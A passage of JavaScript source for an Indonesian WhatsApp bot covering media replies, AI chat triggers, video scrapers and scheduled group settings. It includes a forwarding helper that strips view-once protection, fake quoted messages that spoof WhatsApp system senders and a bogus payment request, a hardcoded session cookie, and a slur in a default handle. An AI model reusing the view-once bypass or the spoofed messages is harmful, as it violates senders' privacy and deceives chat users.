alya.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageAlya){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./data/AlyaMedia/image/${BhosdikaXeon}.jpg`)
alya.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoAlya){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./data/AlyaMedia/video/${BhosdikaXeon}.mp4`)
alya.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}
alya.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}
}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await alya.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage
}














const botname     = global.botname     || 'Alya Assistant'
const ownername   = global.ownername   || 'Owner'
const ownernumber = global.ownernumber || '6285602845943'
const tele        = global.tele        || '@martabaknigga'
const socialm     = global.socialm     || 'GitHub: -'
const location    = global.location    || 'Indonesia'
const wm          = global.watermark   || botname



const thumb     = resolveCardThumb(null, null)
const defaultpp = global.thumb || (() => {
  try { return fs.readFileSync('./data/image/thumb.jpg') } catch { return Buffer.alloc(0) }
})()


const lep = {
  key: {
    fromMe: true,
    participant: `0@s.whatsapp.net`,
    ...({ remoteJid: "" })
  },
  message: {
    "imageMessage": {
      "mimetype": "image/jpeg",
      "caption":  `${ownername}`,
      "jpegThumbnail": defaultpp
    }
  }
}


const ftext = {
  key: {
    fromMe: false,
    participant: `0@s.whatsapp.net`,
    ...(from ? {
    remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) },
  message: {
  extendedTextMessage: {
  text: `${m.pushName}`,
  title: `${m.pushName}`,
  jpegThumbnail: defaultpp } } }



const ftroli = {key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}






const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} }


const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}


const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "120363421179070899@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}


const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}


const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}


const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=${ownernumber}:${ownernumber}\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}


const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"mimetype": "image/jpeg","caption": wm,"jpegThumbnail": defaultpp}}}


let list = []
for (let i of global.owner) {
  const _ownerName = (await alya.getName(i)) || ownername
  list.push({
    displayName: _ownerName,
    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${_ownerName}\nFN:${_ownerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${tele}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
  })
}


const repPy = {
  key: {
    remoteJid: '0@s.whatsapp.net',
    fromMe: false,
    id: `${ownername}`,
    participant: '0@s.whatsapp.net'
  },
  message: {
    requestPaymentMessage: {
      currencyCodeIso4217: "USD",
      amount1000: 999999999,
      requestFrom: '0@s.whatsapp.net',
      noteMessage: {
        extendedTextMessage: {
          text: `${botname}`
        }
      },
      expiryTimestamp: 999999999,
      amount: {
        value: 91929291929,
        offset: 1000,
        currencyCode: "INR"
      }
    }
  }
}




if (!m.key.fromMe && db.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await alya.readMessages([readkey]);
}

alya.sendPresenceUpdate('available', m.chat)

if (global.autoTyping) {
if (command) {
alya.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
alya.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await alya.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
if (process.env.NODE_ENV !== 'production') console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await alya.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}
const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await alya.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
if (process.env.NODE_ENV !== 'production') console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await alya.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

if (global.sewa) sewa = global.sewa






if (!m.key.fromMe && !m.isBaileys) {
  
  
  if (global.alisaDisabled === true) {
    
    
  } else {
  try {
    
    
    if (!alya.user?.id) return;
    const _botNumber = alya.decodeJid(alya.user.id);
    const _botLid = alya.decodeJid(alya.user.lid || '');

    
    const _jidKey = (j) => String(j || '').split('@')[0].split(':')[0].replace(/\D/g, '');
    const _isBotMentioned = !!(m.mentionedJid?.some(j =>
      _jidKey(j) && (_jidKey(j) === _jidKey(_botNumber) || (_botLid && _jidKey(j) === _jidKey(_botLid)))
    ));

    
    
    
    
    const _prompt = resolveAIPrompt(m, budy, _botNumber, _botLid);
    let _aiBody = _prompt.text;
    if (_isBotMentioned && _aiBody) {
      _aiBody = _aiBody.replace(/@\d+/g, '').trim();
    }

    
    
    const _bodyForAI = _isBotMentioned ? (_aiBody || 'Halo') : _aiBody;

    const _shouldAI = isAITriggered({
      body: _bodyForAI,
      m: m,
      botNumber: _botNumber,
      botLid: _botLid,
      isAutoAiGc: isAutoAiGcAlisa   
    });

    
    
    const _canRunAI = _shouldAI && (
      _isBotMentioned
        ? true                                  
        : (_bodyForAI && !isAnyPrefix(_bodyForAI))
    );

    
    
    
    if (m.isGroup && !_canRunAI) {
      console.log(`[Alya AI Gate] Diabaikan di grup ${m.chat} — isAutoAiGcAlisa=${isAutoAiGcAlisa}, shouldAI=${_shouldAI}, replyBot=${isReplyToBot(m, _botNumber, _botLid)}, mentioned=${_isBotMentioned}, source=${_prompt.source || '-'}, body="${(_bodyForAI || '').slice(0, 40)}"`);
    }

    if (_canRunAI) {
      await runAIInteractive({
        body: _bodyForAI,
        m: m,
        alya: alya,
        from: from,
        sender: sender,
        pushname: pushname,
        isGroup: m.isGroup
      });
    }
  } catch(e) {
    
    
    
    console.error('[Alya AI Interactive Error]', e?.stack || e.message);
    try {
      await alya.sendMessage(from, {
        text: `😵 Ada error pas mau proses AI. Coba ulangi lagi ya.`,
      }, { quoted: m });
    } catch {}
  }
  } 
}

if (!global.alisaDisabled && m.isGroup && ChatAlya1.includes(m.chat) && !m.fromMe && !m.isBaileys) {
    if (!m.text && !m.quoted) return;

    const ytRegex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\/.+$/g;
    if (m.text && ytRegex.test(m.text)) {
        return alya.emit('chat-update', { ...m, body: `${prefix}ytmp3 ${m.text}` });
    }

    try {
      if (!alya.user?.id) return;
      const _chatBotNumber = alya.decodeJid(alya.user.id);
      const _chatBotLid = alya.decodeJid(alya.user.lid || '');
      const _chatPrompt = resolveAIPrompt(m, budy, _chatBotNumber, _chatBotLid);
      await runAIInteractive({
        body: _chatPrompt.text,
        m: m,
        alya: alya,
        from: m.chat,
        sender: sender,
        pushname: pushname,
        isGroup: true,
      });
    } catch (err) {
      console.error('[Alya AutoChat Error]', err);
    }
}





















if (!global.alisaDisabled && m.isGroup && !m.key.fromMe && isAutosimi) {
  const AlyaChaty = `${budy}`
  
  if (AlyaChaty && !isAnyPrefix(AlyaChaty)) {
    const _isAlyaAiGlobal = global.db?.settings?.[botNumber]?.alyaai_global !== false
    if (_isAlyaAiGlobal) AlyaAI(pushname, AlyaChaty)
  }
}
if (!global.alisaDisabled && m.isGroup && isAutoAiGc && !m.key.fromMe) {
  const AlyaChaty = `${budy}`
  
  if (AlyaChaty && !isAnyPrefix(AlyaChaty)) {
    const _isAlyaAiGlobal2 = global.db?.settings?.[botNumber]?.alyaai_global !== false
    if (_isAlyaAiGlobal2) AlyaAI(pushname, AlyaChaty)
  }
}
if (automati && !global._automaticCronRegistered) {
  global._automaticCronRegistered = true
  nodecron.schedule('0 */1 * * *', () => {
    process.exit()
  })
}


if (!global.alisaDisabled && !m.key.fromMe && m.isGroup && isAlyaChat) {
const AlyaChaty = `${budy}`

if (AlyaChaty && !isAnyPrefix(AlyaChaty)) {
const _isAlyaAiGlobal3 = global.db?.settings?.[botNumber]?.alyaai_global !== false
if (_isAlyaAiGlobal3) AlyaAI(pushname,AlyaChaty)
}
}

if (!m.isGroup && !Ryuu && db.settings[botNumber].onlygrub ) {
        	if (command){
            return;
            }
        }

async function makeSticker(media,Sticker, StickerTypes){
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
let jancok = new Sticker(media, {
pack: global.packname, 
author: global.author, 
type: StickerTypes.FULL, 
categories: ['🤩', '🎉'], 
id: '12345', 
quality: 70, 
background: '#FFFFFF00' 
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono.path);
await alya.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}

async function sendPoll(jid, text, list) {
alya.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
hasil.push({
link: $(h).find('a').attr('href'),
gambar: $(h).find('img').attr('data-src'),
karakter: $(h).find('div.char-name').text().trim(),
anime: $(h).find('div.anime-title').text().trim(),
episode: $(h).find('div.meta').text(),
up_at: $(h).find('small.meta').text(),
quotes: $(h).find('div.quote').text().trim()
})
            })
            resolve(hasil)
        }).catch(reject)
    })
}




async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})

Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
} else {
u[posi].db[pos].count += 1
}
}

debouncedWrite('./database/commandUser.json', () => _cmdUser, 5000)
}

alya.autoshalat = alya.autoshalat ? alya.autoshalat : {}
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? alya.user.id : m.sender
let id = m.chat 
if (id in alya.autoshalat) {
    return false
}
function loadGroupList() {
    try {
        
        
        return pler || [];
    } catch {
        return [];
    }
}

function saveGroupList(list) {
    debouncedWrite('./database/gruplist.json', () => ({ groups: list }), 3000);
}

const pesanOpen = "🌅 Selamat Pagi! Group telah *dibuka* otomatis oleh sistem.";
const pesanClose = "🌙 Waktunya istirahat! Group telah *ditutup* otomatis oleh sistem.";

cron.schedule('0 5 * * *', async () => {
    const groupList = loadGroupList();
    try {
        for (let idGroup of groupList) {
            await alya.groupSettingUpdate(idGroup, "not_announcement");
            await alya.sendMessage(idGroup, { text: pesanOpen });
        }
        if (process.env.NODE_ENV !== 'production') console.log("✅ Semua group telah dibuka otomatis pukul 05:00 WIB");
    } catch (e) {
        console.log("❌ Error buka group:", e);
    }
}, { timezone: "Asia/Jakarta" });


cron.schedule('0 1 * * *', async () => {
    const groupList = loadGroupList();
    try {
        for (let idGroup of groupList) {
            await alya.groupSettingUpdate(idGroup, "announcement");
            await alya.sendMessage(idGroup, { text: pesanClose });
        }
        if (process.env.NODE_ENV !== 'production') console.log("✅ Semua group telah ditutup otomatis pukul 01:00 WIB");
    } catch (e) {
        console.log("❌ Error tutup group:", e);
    }
}, { timezone: "Asia/Jakarta" });
async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
debouncedWrite('./database/command.json', () => _db, 5000) 
} else {
_db[posi].count += 1
debouncedWrite('./database/command.json', () => _db, 5000) 
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const getBuffer = async (url) => {
    const res = await axios({
        method: "GET",
        url,
        responseType: "arraybuffer",
        
        
        
        
        validateStatus: (status) => status < 500
    });

    
    
    
    
    
    
    
    
    
    
    const buf = Buffer.from(res.data);
    const looksLikeJson = buf.length > 0 && (buf[0] === 0x7b || buf[0] === 0x5b); 
    if (looksLikeJson) {
        let parsed = null;
        try { parsed = JSON.parse(buf.toString('utf-8')); } catch {   }
        if (parsed && typeof parsed === 'object') {
            const err = new Error(
                `API mengembalikan JSON, bukan file biner. ` +
                (parsed.message || parsed.msg || JSON.stringify(parsed).slice(0, 200))
            );
            err.isJsonResponse = true;
            err.jsonData = parsed;
            throw err;
        }
    }

    if (!buf || buf.length < 100) {
        const err = new Error('Response API kosong atau terlalu kecil untuk berupa file valid.');
        err.isEmptyResponse = true;
        throw err;
    }

    return buf;
};
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}
async function replyreseller(teks) {
    reply(`Fitur ini untuk pengguna reseller, hubungi pemilik untuk menjadi pengguna reseller`)
}
async function replyhigh(teks) {
    reply(`Fitur ini untuk pengguna pt dan own. hubungi pemilik untuk membeli tier tersebut`)
}
async function replyall(teks) {
    reply(`Fitur ini untuk pengguna reseller,adp,pt,own, hubungi pemilik untuk membeli tier tersebut`)
}
async function replyadminp(teks) {
    reply(`Fitur ini untuk pengguna Admin Panel, hubungi pemilik untuk menjadi pengguna Admin Panel`)
}
        
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await quoted.download()
await alya.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
if (process.env.NODE_ENV !== 'production') console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await quoted.download()
await alya.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }


if (
  budy.startsWith('https://vt.tiktok.com/') || 
  budy.startsWith('https://www.tiktok.com/') || 
  budy.startsWith('https://t.tiktok.com/') || 
  budy.startsWith('https://vm.tiktok.com/')
) {

  let biaya = 3
  if (db.users[m.sender].limit < biaya) {
    return replyalya(`Hmph! Limit kamu itu nggak cukup! 😒\n\n💡 Sadar diri dong, butuh ${biaya} limit buat ini. Sana cari dulu, baka!`)
  }

  await alya.sendMessage(m.chat, { react: { text: '🙄', key: m.key } })

  try {
    const axios = require('axios')
    const cheerio = require('cheerio')

    let apiData = {}

    try {
      const api = await axios.get(
        `https://api.nexray.web.id/downloader/tiktok?url=${encodeURIComponent(budy)}`
      )

      if (api.data?.status) {
        apiData = api.data.result
      }
    } catch (e) {
      console.log('API NexRay error:', e.message)
    }

    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded',
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      Origin: 'https://savett.cc',
      Referer: 'https://savett.cc/en1/download',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'
    }

    const page = await axios.get('https://savett.cc/en1/download')
    const csrf = page.data.match(/name="csrf_token" value="([^"]+)"/)?.[1]

    const cookie = page.headers['set-cookie']
      ?.map(v => v.split(';')[0])
      .join('; ')

    const post = await axios.post(
      'https://savett.cc/en1/download',
      `csrf_token=${encodeURIComponent(csrf)}&url=${encodeURIComponent(budy)}`,
      { headers: { ...headers, Cookie: cookie } }
    )

    const $ = cheerio.load(post.data)

    const stats = []
    $('#video-info .my-1 span').each((_, el) => stats.push($(el).text().trim()))

    let data = {
      username: apiData?.author?.fullname || $('#video-info h3').first().text().trim() || 'Gak kenal!',
      desc: apiData?.title || 'Gak ada captionnya, hmph!',
      duration: apiData?.duration || $('#video-info p.text-muted').first().text().replace(/Duration:/i, '').trim(),
      views: apiData?.stats?.views || stats[0] || '0',
      likes: apiData?.stats?.likes || stats[1] || '0',
      comments: apiData?.stats?.comment || stats[3] || '0',
      shares: apiData?.stats?.share || stats[4] || '0',
      type: null,
      mp4: { nowm: [], wm: [] },
      mp3: apiData?.music_info?.url ? [apiData.music_info.url] : [],
      slides: []
    }

    const slides = $('.carousel-item[data-data]')

    if (slides.length) {
      data.type = 'photo'

      slides.each((_, el) => {
        try {
          const json = JSON.parse($(el).attr('data-data').replace(/&quot;/g, '"'))
          json.URL?.forEach(u => data.slides.push(u))
        } catch {}
      })

    } else {
      data.type = 'video'

      $('#formatselect option').each((_, el) => {
        const label = $(el).text().toLowerCase()
        const raw = $(el).attr('value')
        if (!raw) return

        try {
          const json = JSON.parse(raw.replace(/&quot;/g, '"'))

          if (label.includes('mp4') && !label.includes('watermark'))
            data.mp4.nowm.push(...json.URL)

          if (label.includes('watermark'))
            data.mp4.wm.push(...json.URL)

          if (label.includes('mp3'))
            data.mp3.push(...json.URL)

        } catch {}
      })
    }

    if (data.type === 'photo' && data.slides.length) {

      let cards = await Promise.all(
        data.slides.map(async (img, i) => ({
          header: proto.Message.InteractiveMessage.Header.create({
            ...(await prepareWAMessageMedia(
              { image: { url: img } },
              { upload: alya.waUploadToServer }
            )),
            title: '',
            subtitle: `Nih, foto ke-${i + 1}. Seneng kan? 🙄`,
            hasMediaAttachment: false
          }),
          body: { text: '' },
          nativeFlowMessage: { buttons: [] }
        }))
      )

      db.users[m.sender].limit -= biaya
      let sisa = db.users[m.sender].limit

      let msg = generateWAMessageFromContent(
        m.chat,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: `📸 *Tiktok Photo (Auto)*\n\nNih, fotonya udah aku ambilin secara otomatis. Berterima kasihlah sedikit padaku, baka! 💢\n\n👤 User : *${data.username}*\n❤️ Like : ${data.likes}\n💬 Komen : ${data.comments}\n\n📝 ${data.desc}\n\n━━━━━━━━━━━━━━━\n💸 Pajak : ${biaya} Limit\n📊 Sisa : ${sisa}`
                },
                carouselMessage: { cards, messageVersion: 1 }
              }
            }
          }
        },
        { quoted: m }
      )

      await alya.sendMessage(m.chat, { react: { text: '💖', key: m.key } })
      return alya.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
    }

    const videoUrl = apiData?.data || data.mp4.nowm[0] || data.mp4.wm[0]
    if (!videoUrl) throw 'Gak ketemu videonya! Kamu sih kasih link aneh!'

    db.users[m.sender].limit -= biaya
    let sisa = db.users[m.sender].limit

    await alya.sendMessage(
      m.chat,
      {
        video: { url: videoUrl },
        caption: `🎥 *Tiktok Video (Auto)*\n\nAbis liat link langsung aku duniain nih. Bukan karena aku mau ya, cuma kebetulan lagi luang aja! 🙄\n\n👤 User : *${data.username}*\n⏱ Durasi : ${data.duration}\n❤️ Like : ${data.likes}\n\n📝 ${data.desc}\n\n━━━━━━━━━━━━━━━\n💸 Pajak : ${biaya} Limit\n📊 Sisa : ${sisa}`,
        buttons: data.mp3.length ? [
          {
            buttonId: `${prefix}ttaudio ${budy}`,
            buttonText: { displayText: '🎵 Musiknya (Duh, manja!)' },
            type: 1
          }
        ] : [],
        headerType: 4
      },
      { quoted: m }
    )

    await alya.sendMessage(m.chat, { react: { text: '✅', key: m.key } })

  } catch (err) {
    console.error(err)
    await alya.sendMessage(m.chat, { react: { text: '💢', key: m.key } })
    replyalya('Hmph! Gagal... Jangan salahin aku ya, salahin tuh internet kamu atau link-nya yang aneh! 😤')
  }
}





if(budy.includes('https://www.facebook.com/')){
const fg = require('api-dylux')
